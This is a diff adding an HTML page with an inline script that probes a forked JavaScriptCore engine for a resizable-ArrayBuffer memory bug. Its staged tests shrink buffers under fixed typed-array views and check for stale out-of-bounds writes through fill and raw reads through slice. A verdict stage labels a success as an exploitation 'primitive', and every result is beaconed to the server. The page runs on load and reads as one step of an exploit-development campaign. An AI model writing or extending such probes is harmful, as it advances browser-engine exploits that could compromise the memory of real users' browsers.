@@ -1,0 +1,207 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>FA-v20-rab2 — press-13: desambiguador zeroing + capa-2 fixed-view (V13-DESIGN)</title></head>
+<body><script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])!==-1&&location.href.indexOf(u)===-1||u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script><pre id="out">FA-v20-rab2…</pre>
+<script>
+(function(){
+"use strict";
+/* FA-v20-rab2 — press-13 (diseño V13-DESIGN dsh v4-pro MAX, sobre el wire del press-12).
+ * OBJETIVO 1 (desambiguador zeroing): ¿el zeroing del S6 (kept=0/56) ocurre al ENCOGER o al CRECER?
+ *   El árbol dice: SOLO al crecer — ArrayBuffer.cpp:540-541 memset([old,new),0) dentro de resize;
+ *   el encoger NO hace memset (solo mprotect por páginas :480-538, no-op para 64B<1 página);
+ *   el wrapper JS (JSArrayBufferPrototype.cpp:267-291) es delgado, sin zeroing extra.
+ *   Consecuencia del árbol: un fill-stale escribe DURANTE la fase encogida y el re-crecer BORRA
+ *   la evidencia ⇒ leaked=0 del press-10/12 es AMBIGUO, no REAL.
+ *   Por qué la secuencia de marcas clásica NO sirve: si la marca muere, la mató el encoger O el
+ *   crecer (indistinguible con lecturas de vista auto-length); si sobrevive, NO hay zeroing en
+ *   absoluto ⇒ contradice S6. Equivalencia observacional demostrada en v13-design-scratch.md.
+ *   CANAL REAL: una vista FIJA (new Uint8Array(rab,0,64)). El árbol clamp-ea su length() a 0
+ *   vía integerIndexedObjectLength().value_or(0) (JSArrayBufferView.h:300-307) y sus lecturas
+ *   dan undefined. SI EL FORK NO CLAMPEA, leemos [8,64) SIN re-crecer: patrón=encoger-no-zeroea,
+ *   0=encoger-zeroea; y tras re-crecer vemos si el grow zeroea (gWipe).
+ * OBJETIVO 2 (capa-2): V=new Uint8Array(rab,32,32) → resize(8) → ¿V.length clampea a 0?
+ *   Árbol: SÍ — length()=0, byteOffset()=0, V[0]=undefined, y V.fill/V.slice tiran TypeError
+ *   "Underlying ArrayBuffer has been detached from the view or out-of-bounds"
+ *   (JSGenericTypedArrayViewPrototypeFunctions.h:531-538 fill · :819-838 slice, vía
+ *   integerIndexedObjectLength→nullopt por isArrayBufferViewOutOfBounds, JSArrayBufferViewInlines.h:110-127).
+ *   Divergencias que cazamos: fill=ok (escritura stale en [32,64) con bounds de la vista),
+ *   slice=ok (copia RAW observable del [32,64) = canal de lectura que salta el zeroing del grow).
+ * REGLAS DS: RAB ≤64B (<4096 ⇒ el gate de páginas de resize nunca dispara), NUNCA resize(0),
+ *   todo try-catch, HB 2s, slice 500, beacons V21-*. GATE DE SEGURIDAD: si S1 delata firma de
+ *   REALLOC (bytes basura), S5 (escritura stale) se salta para no escribir en bloque liberado.
+ * 0-crash por construcción: S1 solo lee (primer stage → si el fork mprotect-ea en shrink, el
+ *   crash se atribuye aquí); S2/S3 leen/escriben SIEMPRE en rango visible; S5 es el único write
+ *   stale y corre último, gateado, dentro de la reserva mapeada de 64B. */
+var RID="v20r"+Date.now().toString(36).slice(-13);
+var out=document.getElementById("out");
+function say(s){try{out.appendChild(document.createTextNode("\n"+s));}catch(e){}}
+function bk(s,b){try{fetch("/beacon/V21-"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,500)})}).catch(function(){});}catch(e){}}
+var HB=setInterval(function(){bk("HB","hb");},2000);
+
+var dr="-",rt="-";
+try{ dr=typeof window.deriveRuntime; rt=(dr==="object"&&window.deriveRuntime)?typeof window.deriveRuntime.run:"-"; }catch(e){}
+bk("L","v20-rab2; dr="+dr+"; rt="+rt);
+
+/* estado compartido para el veredicto S6 */
+var s1sig="-",gWipe="-",fillR="-",sl2="-",rawW="-";
+
+/* S1 — FIXED-VIEW RAW-READ: ¿clamp-ea el fork las lecturas de vista FIJA post-shrink?
+ *     (la llave que abre el canal de lectura sin re-crecer + semilla de la matriz S/G) */
+(function(){
+  var m="E",e1="",vFlen="-",r8="-",r40="-",r63="-",patN="-",zeroN="-",undefN="-";
+  try{
+    var rab=new ArrayBuffer(64,{maxByteLength:64});
+    var v=new Uint8Array(rab);
+    for(var i=0;i<64;i++) v[i]=i;               /* patrón P: v[i]=i */
+    var vF=new Uint8Array(rab,0,64);            /* vista FIJA (offset 0, len 64 explícito) */
+    rab.resize(8);
+    vFlen=String(vF.length);                    /* árbol: 0 (length()→nullopt→value_or(0)) */
+    r8=String(vF[8]); r40=String(vF[40]); r63=String(vF[63]);  /* árbol: undefined */
+    var p=0,z=0,u=0;
+    for(var j=8;j<64;j++){
+      var x=vF[j];
+      if(x===undefined) u++; else if(x===j) p++; else if(x===0) z++;
+    }
+    patN=p; zeroN=z; undefN=u;
+    if(u===56) s1sig="CLAMPED";                 /* canal muerto: spec-ok */
+    else if(p===56) s1sig="RAW-PATTERN";        /* raw + encoger NO zeroea */
+    else if(z===56) s1sig="RAW-ZERO";           /* raw + encoger zeroea */
+    else s1sig="GARBAGE";                       /* firma realloc/parcial */
+    rab.resize(64);                             /* re-crecer: ¿zeroea el grow? */
+    var w=new Uint8Array(rab), gz=0, gp=0;
+    for(var j2=8;j2<64;j2++){ if(w[j2]===0) gz++; else if(w[j2]===j2) gp++; }
+    gWipe=(gp===56)?"G-PRESERVE":(gz===56)?"G-ZERO":"MIXED:"+gz;
+    m="ok";
+  }catch(e){ e1=String((e&&e.message)||e).slice(0,50); }
+  bk("S1","fx="+m+";e="+e1+";vFlen="+vFlen+";r8="+r8+";r40="+r40+";r63="+r63+";patN="+patN+";zeroN="+zeroN+";undefN="+undefN+";sig="+s1sig+";gWipe="+gWipe);
+})();
+
+/* S2 — G-SCOPE: ¿el zeroing toca solo lo recién expuesto [old,new)? (alcance, no retroactivo) */
+(function(){
+  var m="E",e1="",kept8="-",tailN="-";
+  try{
+    var rab=new ArrayBuffer(64,{maxByteLength:64});
+    var v=new Uint8Array(rab);
+    for(var i=0;i<64;i++) v[i]=i;               /* P */
+    rab.resize(8);
+    rab.resize(16);
+    var w=new Uint8Array(rab);                  /* auto-length, len 16 */
+    for(var j=8;j<16;j++) w[j]=0xA5;            /* marca M en [8,16) */
+    rab.resize(64);                             /* crecer 16→64: NO re-expone [8,16) */
+    var w2=new Uint8Array(rab);
+    var k=0;
+    for(var j2=8;j2<16;j2++){ if(w2[j2]===0xA5) k++; }
+    kept8=String(k)+"/8";
+    var t=0;
+    for(var j3=16;j3<64;j3++){ if(w2[j3]!==0) t++; }
+    tailN=String(t);                            /* árbol: 0 = el grow 16→64 zeroeo [16,64) */
+    m="ok";
+  }catch(e){ e1=String((e&&e.message)||e).slice(0,50); }
+  bk("S2","sc="+m+";e="+e1+";kept8="+kept8+";tailN="+tailN);
+})();
+
+/* S3 — MARKSEQ (la secuencia de marcas clásica, con interpretación CORREGIDA):
+ *      marca muerta = encoger∨crecer∨realloc (consistente con S6);
+ *      marca viva 24/24 = NO hay zeroing en absoluto ⇒ S6 necesitaría explicación REALLOC. */
+(function(){
+  var m="E",e1="",markN="-";
+  try{
+    var rab=new ArrayBuffer(64,{maxByteLength:64});
+    var v=new Uint8Array(rab);
+    for(var i=0;i<64;i++) v[i]=i;               /* P */
+    rab.resize(8);
+    rab.resize(32);
+    var w=new Uint8Array(rab);                  /* len 32 */
+    for(var j=8;j<32;j++) w[j]=0x5A;            /* M en [8,32) */
+    rab.resize(8);                              /* encoger 32→8 (cruza [8,32)) */
+    rab.resize(64);                             /* crecer 8→64 (cruza [8,64)) */
+    var w2=new Uint8Array(rab);
+    var k=0;
+    for(var j2=8;j2<32;j2++){ if(w2[j2]===0x5A) k++; }
+    markN=String(k)+"/24";
+    m="ok";
+  }catch(e){ e1=String((e&&e.message)||e).slice(0,50); }
+  bk("S3","mk="+m+";e="+e1+";mark8_31="+markN);
+})();
+
+/* S4 — CAPA-2 ÉTAT: vista FIJA byteOffset=32 len=32 → shrink a 8 → ¿qué ve el fork? */
+(function(){
+  var m="E",e1="",san="-",vlen="-",r0="-",bo="-",slE="-",sl="-",vlen2="-";
+  try{
+    var rab=new ArrayBuffer(64,{maxByteLength:64});
+    var v=new Uint8Array(rab);
+    for(var i=0;i<64;i++) v[i]=0x77;
+    var V=new Uint8Array(rab,32,32);            /* fixed view byteOffset=32 len=32 */
+    san=(V[0]===0x77 && V.length===32)?"ok":"WEIRD";
+    rab.resize(8);
+    vlen=String(V.length);                      /* árbol: 0 — ¿clampea? */
+    r0=String(V[0]);                            /* árbol: undefined (índice 32 ≥ byteLength 8) */
+    bo=String(V.byteOffset);                    /* árbol: 0 (byteOffset() OOB→0) */
+    try{
+      var A=V.slice();                          /* árbol: TypeError */
+      var c77=0,c0=0;
+      for(var j=0;j<A.length;j++){ if(A[j]===0x77)c77++; else if(A[j]===0)c0++; }
+      sl="ok:len="+A.length+":77="+c77+":0="+c0;
+    }catch(e2){ slE=String((e2&&e2.message)||e2).slice(0,60); }
+    rab.resize(64);
+    vlen2=String(V.length);                     /* árbol: 32 (recupera al volver a rango) */
+    m="ok";
+  }catch(e){ e1=String((e&&e.message)||e).slice(0,50); }
+  bk("S4","c2="+m+";e="+e1+";san="+san+";vlen="+vlen+";r0="+r0+";bo="+bo+";slE="+slE+";sl="+sl+";vlen2="+vlen2);
+})();
+
+/* S5 — CAPA-2 WRITE CHAIN: prefill 0x77 → shrink → V.fill(0xC3) con bounds stale → ¿escribe?
+ *      Observación A (si S1 desbloqueó el canal raw): vF[32..63] SIN re-crecer.
+ *      Observación B: V.slice() en la fase encogida (copia raw si el fork no OOB-checkea).
+ *      Observación C: tras re-crecer (el zeroing del grow decide). */
+(function(){
+  var m="E",e1="",fillE="-";
+  if(s1sig==="GARBAGE"){ bk("S5","SKIP:realloc-signature(S1="+s1sig+")"); return; }
+  try{
+    var rab=new ArrayBuffer(64,{maxByteLength:64});
+    var v=new Uint8Array(rab);
+    for(var i=0;i<64;i++) v[i]=0x77;
+    var V=new Uint8Array(rab,32,32);
+    var vF=new Uint8Array(rab,0,64);            /* creada ANTES del encoger (offset0+64≤64 válido) */
+    rab.resize(8);
+    try{ V.fill(0xC3); fillR="ok"; }catch(e2){ fillE=String((e2&&e2.message)||e2).slice(0,60); }
+    if(s1sig==="RAW-PATTERN"||s1sig==="RAW-ZERO"){
+      var c3=0;
+      for(var j=32;j<64;j++){ if(vF[j]===0xC3) c3++; }
+      rawW=String(c3)+"/32";
+    } else { rawW="chan-dead"; }
+    try{
+      var A=V.slice(); var c3b=0;
+      for(var j2=0;j2<A.length;j2++){ if(A[j2]===0xC3)c3b++; }
+      sl2="ok:len="+A.length+":C3="+c3b;
+    }catch(e3){ sl2="E:"+String((e3&&e3.message)||e3).slice(0,50); }
+    rab.resize(64);
+    var w=new Uint8Array(rab), g3=0;
+    for(var j3=32;j3<64;j3++){ if(w[j3]===0xC3) g3++; }
+    var gW=String(g3)+"/32";
+    m="ok";
+    bk("S5","wr="+m+";e="+e1+";fillE="+fillE+";fillR="+fillR+";rawW="+rawW+";sl2="+sl2+";gW="+gW);
+  }catch(e){ e1=String((e&&e.message)||e).slice(0,50); bk("S5","wr="+m+";e="+e1+";fillE="+fillE+";fillR="+fillR+";rawW="+rawW+";sl2="+sl2); }
+})();
+
+/* S6 — VERDICTO: matriz S/G + implicación para los leaked=0 del press-10/12 + estado capa-2 */
+(function(){
+  var zS="?",zG="?";
+  if(s1sig==="RAW-ZERO") zS="S=1"; else if(s1sig==="RAW-PATTERN") zS="S=0"; else if(s1sig==="CLAMPED") zS="?";
+  if(gWipe==="G-ZERO") zG="G=1"; else if(gWipe==="G-PRESERVE") zG="G=0"; else zG="?";
+  var verdict;
+  if(s1sig==="CLAMPED") verdict="CHANNEL-DEAD→TREE-G→leaked0=AMBIGUO";
+  else if(zS==="S=0"&&zG==="G=1") verdict="TREE-EXACT:G-zero→leaked0=AMBIGUO";
+  else if(zS==="S=1"&&zG==="G=0") verdict="S-ONLY→leaked0=REAL→capa1-cierra";
+  else if(zS==="S=1"&&zG==="G=1") verdict="BOTH→leaked0=AMBIGUO";
+  else if(zS==="S=0"&&zG==="G=0") verdict="NONE→S6-necesita-REALLOC";
+  else verdict="MIXED/INCONCLUSO";
+  var cap2="-";
+  if(fillR==="ok"&&(sl2.indexOf("C3=32")>=0||rawW==="32/32")) cap2="PRIMITIVE(fill-stale+raw-read)";
+  else if(fillR==="ok") cap2="WRITE-ONLY(no-observable)";
+  else cap2="TREE(fill=TypeError)";
+  bk("S6","zS="+zS+";zG="+zG+";S1="+s1sig+";V="+verdict+";cap2="+cap2);
+})();
+
+setTimeout(function(){ clearInterval(HB); bk("Z","FA-v20-rab2 complete; DR_OK="+(rt==="function")+(rt!=="function"?" DRGATE":"")); },1600);
+})();
+</script></body></html>
